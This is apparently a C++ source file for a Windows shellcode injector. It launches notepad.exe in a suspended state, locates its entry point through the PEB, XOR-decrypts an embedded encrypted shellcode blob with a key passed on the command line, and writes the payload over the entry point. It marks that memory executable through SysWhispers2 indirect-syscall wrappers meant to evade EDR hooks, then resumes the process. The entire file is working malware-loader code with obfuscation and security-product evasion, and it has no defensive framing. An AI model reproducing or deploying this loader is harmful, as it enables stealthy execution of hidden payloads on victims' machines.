#include <Windows.h>
#include <iostream>     
//#include <winternl.h>
#include "SysWhispers2/indirect_syscalls/evade.h"
#pragma comment(lib, "ntdll.lib")

int main(int argc, char* argv[])
{
        unsigned char shellcode[] = "\x9d\x24\xe2\x88\x91\x84\xad\x6c\x61\x6c\x20\x3d\x20\x3c\x33\x24\x50\xbe\x4\x24\xea\x3e\x1\x3d\x37\x24\xea\x3e\x79\x24\xea\x3e\x41\x24\x6e\xdb\x2b\x26\x2c\x5d\xa8\x24\xea\x1e\x31\x24\x50\xac\xcd\x50\x0\x10\x63\x40\x41\x2d\xa0\xa5\x6c\x2d\x60\xad\x83\x81\x33\x2d\x30\x24\xea\x3e\x41\xe7\x23\x50\x29\x6d\xb1\xa\xe0\x14\x79\x67\x63\x63\xe4\x1e\x61\x6c\x61\xe7\xe1\xe4\x61\x6c\x61\x24\xe4\xac\x15\xb\x29\x6d\xb1\xe7\x29\x74\x25\xe7\x21\x4c\x31\x25\x60\xbc\x82\x3a\x2c\x5d\xa8\x24\x9e\xa5\x20\xe7\x55\xe4\x29\x6d\xb7\x24\x50\xac\x20\xad\xa8\x61\xcd\x2d\x60\xad\x59\x8c\x14\x9d\x2d\x6f\x2d\x48\x69\x29\x58\xbd\x14\xb4\x39\x28\xea\x2c\x45\x25\x60\xbc\x7\x2d\xea\x60\x29\x28\xea\x2c\x7d\x25\x60\xbc\x20\xe7\x65\xe4\x29\x6d\xb1\x2d\x39\x2d\x39\x32\x38\x36\x20\x34\x20\x35\x20\x36\x29\xef\x8d\x4c\x20\x3e\x9e\x8c\x39\x2d\x38\x36\x29\xe7\x73\x85\x2a\x93\x9e\x93\x3c\x25\xdf\x1b\x12\x5e\x3e\x5f\x53\x6c\x61\x2d\x37\x25\xe8\x8a\x29\xed\x8d\xcc\x60\x6c\x61\x25\xe8\x89\x28\xd0\x63\x6c\x60\xd7\xa1\xc4\x60\x79\x20\x38\x28\xe5\x85\x20\xe8\x9d\x20\xd6\x2d\x1b\x47\x6b\x9e\xb9\x2d\xe5\x8b\x4\x60\x6d\x61\x6c\x38\x2d\xdb\x45\xe1\x7\x61\x93\xb4\x6\x6b\x2d\x3f\x3c\x31\x21\x50\xa5\x2c\x5d\xa1\x24\x9e\xac\x29\xe5\xa3\x24\x9e\xac\x29\xe5\xa0\x2d\xdb\x86\x6e\xb3\x81\x93\xb4\x24\xe8\xab\xb\x7c\x20\x34\x2d\xe5\x83\x24\xe8\x95\x20\xd6\xf8\xc9\x15\xd\x9e\xb9\xe4\xac\x15\x66\x28\x93\xaf\x19\x84\x84\xf2\x6c\x61\x6c\x29\xef\x8d\x7c\x29\xe5\x83\x21\x50\xa5\xb\x68\x20\x34\x29\xe5\x98\x2d\xdb\x6e\xb8\xa4\x3e\x93\xb4\xef\x99\x6c\x1f\x39\x29\xef\xa5\x4c\x3f\xe5\x97\x6\x21\x2d\x38\x4\x61\x7c\x61\x6c\x20\x34\x29\xe5\x93\x24\x50\xa5\x20\xd6\x39\xc8\x32\x89\x9e\xb9\x29\xe5\xa2\x25\xe8\xab\x2c\x5d\xa8\x25\xe8\x9c\x29\xe5\xbb\x24\xe8\x95\x20\xd6\x63\xb5\xa9\x33\x9e\xb9\xe2\x94\x61\x11\x49\x34\x20\x3b\x38\x4\x61\x2c\x61\x6c\x20\x34\xb\x6c\x3b\x2d\xdb\x67\x4e\x63\x51\x93\xb4\x3b\x38\x2d\xdb\x19\xf\x21\x0\x93\xb4\x25\x9e\xa2\x88\x50\x9e\x93\x9e\x24\x60\xaf\x29\x45\xa7\x24\xe4\x9a\x14\xd8\x20\x93\x86\x34\xb\x6c\x38\x25\xa6\xae\x91\xd9\xc3\x3a\x9e\xb9";
        char *key = argv[1];
        int key_size = strlen(key);
        

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;

    PROCESS_INFORMATION pi = { 0 };

    // spawn process in suspended state

    if (!CreateProcessW(
        L"C:\\Windows\\System32\\notepad.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        L"C:\\Windows\\System32",
        &si,
        &pi
    )) {
    std::cerr << "CreateProcessW failed: " << GetLastError() << "\n";
    return 1;
}

    // get the process information to find the address of the PEB
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG returnLength;
    /*auto pNtQIP = (decltype(&NotQuery))GetProcAddress(
    GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");*/
NTSTATUS st = CustomQuery(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength);
std::cout << "NtQueryInformationProcess status=0x" << std::hex << st << std::dec << "\n";
    std::cout << "PEB Address: " << pbi.PebBaseAddress << std::endl;

    // the image base address is always at PEB + 0x10 for x64
    auto lpBaseAddress = (LPVOID)((DWORD64)(pbi.PebBaseAddress) + 0x10);

    // read the base address (addresses are 8 bytes for x64)
    LPVOID baseAddress = 0;
    SIZE_T bytesRead = 0;
    ReadProcessMemory(
        pi.hProcess,
        lpBaseAddress,
        &baseAddress,
        8,
        &bytesRead
    );
    std::cout << "Base Address: " << baseAddress << std::endl;

    // now we can read the dos header
    IMAGE_DOS_HEADER dHeader = { 0 };
    ReadProcessMemory(
        pi.hProcess,
        baseAddress,
        &dHeader,
        sizeof(dHeader),
        &bytesRead
    );
        std::cout << "Image Base Address: " << baseAddress << std::endl;
    // use e_lfanew to calculate pointer to nt header
    auto lpNtHeader = (LPVOID)((DWORD64)baseAddress + dHeader.e_lfanew);

    // read the nt header
    IMAGE_NT_HEADERS ntHeaders = { 0 };
    ReadProcessMemory(
        pi.hProcess,
        lpNtHeader,
        &ntHeaders,
        sizeof(ntHeaders),
        &bytesRead
    );
        std::cout << "Entry Point RVA: " << std::hex << ntHeaders.OptionalHeader.AddressOfEntryPoint << std::endl;

    // calculate the entry point address
    auto entryPoint = (LPVOID)((DWORD64)baseAddress + ntHeaders.OptionalHeader.AddressOfEntryPoint);
    std::cout << "Entry Point: " << entryPoint << std::endl;
    // write shellcode to this location, overwriting the PE
    SIZE_T bytesWritten = 0;
    for (size_t i = 0; i < sizeof(shellcode) - 1; i++) {
                shellcode[i] ^= key[i % (strlen(key) - 1)];
        }
            SIZE_T regionSize = sizeof(shellcode);

    
LPVOID protectAddr = entryPoint;
SIZE_T protectSize = sizeof(shellcode);
ULONG oldProt = 0;

 CustomProtect(
    pi.hProcess,
    &protectAddr,
    &protectSize,
    PAGE_EXECUTE_READWRITE,
    &oldProt
);

// Check NT_SUCCESS(st) before continuing

    SIZE_T written = 0;
    st = CustomWrite(
        pi.hProcess,
        entryPoint,
        shellcode,
        sizeof(shellcode),
        &written
    );
    std::cout << "Actually wrote: " << written << " bytes\n";
    CustomProtect(pi.hProcess, &protectAddr, &protectSize, oldProt, &oldProt);

        

std::cout << "Wrote " << bytesWritten << " bytes" << std::endl;
    // resume the process
    ResumeThread(pi.hThread);
}